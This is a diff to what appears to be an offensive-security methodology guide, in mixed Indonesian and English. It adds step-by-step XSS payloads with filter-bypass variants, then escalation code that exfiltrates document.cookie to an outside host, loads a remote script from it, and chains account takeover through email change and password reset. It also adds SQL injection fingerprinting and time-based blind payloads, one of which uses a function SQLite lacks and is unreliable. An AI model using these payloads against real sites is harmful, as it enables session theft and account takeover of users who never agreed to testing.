@@ -716,6 +716,167 @@ def handleResponse(req, interesting):
 
 ## XSS -- Cross-Site Scripting
 
+> **Progressive Probe Rule:** NEVER jump straight to payloads. Always probe chars → tags → handlers → full payload. Each phase filters what actually works on this specific target.
+
+---
+
+### Phase 1 — Character Probe
+Test karakter satu per satu di input field:
+```
+< > " ' ` / = ( ) { } ; &
+```
+Catat hasilnya:
+- **Reflected as-is** → usable
+- **HTML encoded** (`&lt;` `&gt;`) → blocked
+- **Stripped** → blocked
+- **Error triggered** → interesting (mungkin SQLi juga)
+
+---
+
+### Phase 2 — Tag Probe
+Jika `<` dan `>` lolos, test tags:
+```
+<svg> <img> <script> <details> <video> <input> <textarea> <select> <iframe> <math>
+```
+Catat tag mana yang lolos/distrip.
+
+---
+
+### Phase 3 — Event Handler Probe
+Jika tag lolos, test event handlers dikombinasikan dengan tag yang lolos:
+```html
+<svg onload=alert(1)>
+<img src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<input onfocus=alert(1) autofocus>
+```
+Handler list: `onerror onload onfocus onbegin onmouseover ontoggle onanimationstart onpointerover`
+
+---
+
+### Phase 4 — Full Payload Construction
+Bangun dari kombinasi yang lolos:
+
+**Tanpa filter:**
+```html
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+```
+
+**WAF bypass variants:**
+```html
+<!-- Case mixing -->
+<ScRiPt>alert(1)</sCrIpT>
+<ImG sRc=x OnErRoR=alert(1)>
+
+<!-- HTML entity encoding -->
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+
+<!-- Whitespace -->
+<img src=x onerror =alert(1)>
+<img/src=x/onerror=alert(1)>
+
+<!-- atob bypass -->
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+
+<!-- No parentheses -->
+<img src=x onerror=alert`1`>
+
+<!-- SVG animate -->
+<svg><animate onbegin=alert(1) attributeName=x>
+
+<!-- Polyglot (test semua params sekaligus) -->
+jaVasCript:/*-/*`/`/'/"/**/(/ */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>>
+```
+
+**Akamai/Cloudflare/WAF bypass (Next.js + Unicode NFKC):**
+```html
+<!-- Unicode normalization bypass -->
+＜img src=x onerror=alert(1)＞
+<img src=x onerror=\u0061lert(1)>
+<!-- Double URL encode -->
+%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E
+```
+
+---
+
+### Phase 5 — Escalation
+Jika XSS confirmed, eskalasi sesuai konteks:
+
+**Cookie theft (Reflected/Stored):**
+```javascript
+document.location='https://alf.dpdns.org/?c='+document.cookie
+```
+
+**Session hijack via ezXSS:**
+```javascript
+var s=document.createElement('script');
+s.src='//alf.dpdns.org';
+document.body.appendChild(s);
+```
+
+**CSRF chain:**
+```javascript
+fetch('/api/change-email',{
+  method:'POST',
+  credentials:'include',
+  headers:{'Content-Type':'application/json'},
+  body:JSON.stringify({email:'attacker@evil.com'})
+})
+```
+
+**ATO via password reset:**
+```javascript
+fetch('/api/reset-password',{
+  method:'POST',
+  credentials:'include',
+  body:JSON.stringify({password:'hacked123'})
+})
+```
+
+---
+
+### Decision Tree
+```
+Input ditemukan
+    ↓
+Phase 1: Probe chars < > " ' `
+    ↓
+< > lolos? → NO → try encoding bypass → dead end
+    ↓ YES
+Phase 2: Probe tags
+    ↓
+Tag lolos? → NO → try alternative tags / HTMLi
+    ↓ YES
+Phase 3: Probe event handlers
+    ↓
+Handler lolos? → NO → try WAF bypass variants (Phase 4)
+    ↓ YES
+Phase 4: Construct full payload
+    ↓
+Confirmed? → Phase 5: Escalate
+```
+
+---
+
+### Context-Specific Notes
+
+**Reflected XSS:**
+- Cek URL parameter, search field, error message
+- Test semua parameter sekaligus dengan polyglot di atas
+
+**Stored XSS:**
+- Test di semua input yang disimpan ke DB: profile fields, comments, titles, descriptions
+- Check rendering di semua halaman yang display data tersebut
+
+**DOM XSS:**
+- Cari `innerHTML`, `document.write`, `eval` di JS source
+- Test via URL fragment: `#<img src=x onerror=alert(1)>`
+- Gunakan DOM Invader (Burp) untuk auto-detect sinks
+
+---
+
 ### XSS Sinks (grep for these)
 ```javascript
 // HIGH RISK
@@ -740,7 +901,48 @@ location.href = userInput
 - XSS + credential theft via fake login form = ATO
 - XSS in chatbot response = stored XSS chain
 
+
 ## SQL Injection
+
+> **Athul Mindset:** "Recon is everything — find input parameters that interact with the backend, test for error-based responses. Once you understand how databases handle malformed input, you start seeing injection points everywhere."
+
+---
+
+### Phase 1 — DB Fingerprinting (Error-Based)
+Probe minimal dulu, catat error message:
+
+| DB | Error khas | Probe awal |
+|---|---|---|
+| MySQL | `You have an error in your SQL syntax` | `'`, `"`, `1'-- -` |
+| PostgreSQL | `ERROR: unterminated quoted string` | `'::text`, `$$` |
+| MSSQL | `Unclosed quotation mark` | `';--`, `1;WAITFOR DELAY '0:0:5'--` |
+| Oracle | `ORA-01756` / `ORA-00933` | `'\|\|'a`, `1 AND 1=1--` |
+| SQLite | `unrecognized token` | `'`, `1 AND 1=1` |
+
+---
+
+### Phase 2 — Time-Based Blind (kalau tidak ada error visible)
+```sql
+-- MySQL
+' AND SLEEP(5)-- -
+1' AND SLEEP(5)-- -
+
+-- MSSQL
+'; WAITFOR DELAY '0:0:5'--
+1'; WAITFOR DELAY '0:0:5'--
+
+-- PostgreSQL
+'; SELECT pg_sleep(5)--
+1' AND 1=(SELECT 1 FROM pg_sleep(5))--
+
+-- Oracle
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+
+-- SQLite
+' AND 1=1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
+```
+
+---
 
 ### Detection
 ```bash
